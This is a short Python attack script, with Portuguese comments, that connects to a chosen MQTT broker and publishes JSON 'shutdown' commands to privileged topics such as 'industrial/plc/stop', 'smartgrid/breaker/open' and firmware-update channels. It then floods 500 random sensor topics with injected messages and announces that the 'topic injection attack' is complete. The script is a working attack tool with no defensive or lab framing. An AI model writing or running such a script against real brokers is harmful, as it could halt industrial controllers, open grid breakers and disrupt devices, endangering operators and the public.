#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time
import random

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[+] Connected to MQTT broker")
        # Tentativas de publicar em tópicos administrativos
        admin_topics = [
            "$SYS/broker/config",
            "admin/commands",
            "/device/firmware/update",
            "controller/shutdown",
            "$SYS/broker/clients/disconnect",
            "industrial/plc/stop",
            "smartgrid/breaker/open"
        ]
        
        for topic in admin_topics:
            malicious_payload = f"{{\"cmd\":\"shutdown\",\"timestamp\":{int(time.time())}}}"
            client.publish(topic, malicious_payload, qos=2)
            print(f"[*] Published to privileged topic: {topic}")
            time.sleep(0.1)
            
        # Flood com wildcard topics
        for i in range(500):
            topic = f"sensor/{random.randint(1,1000)}/data"
            client.publish(topic, f"injected_{i}", qos=0)
        
        print("[✓] Topic injection attack completed")

if __name__ == "__main__":
    import sys
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    
    client = mqtt.Client()
    client.on_connect = on_connect
    client.connect(broker, 1883, 60)
    client.loop_forever()